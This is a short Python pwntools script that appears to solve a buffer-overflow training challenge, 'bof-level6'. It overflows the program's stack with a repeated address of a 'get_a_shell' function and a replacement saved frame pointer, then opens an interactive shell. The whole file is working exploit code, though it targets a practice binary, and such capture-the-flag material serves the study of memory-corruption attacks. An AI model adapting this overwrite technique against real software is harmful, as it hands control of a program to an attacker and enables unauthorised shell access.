#!/usr/bin/env python

from pwn import *

p = process('./bof-level6')

get_a_shell = 0x40063a

p.sendline(p64(get_a_shell) * 16 + p64(0x7fffffffe300)) # rbp when using gdb: 0x7fffffffe350

output = p.recv()
print(output)

p.interactive()
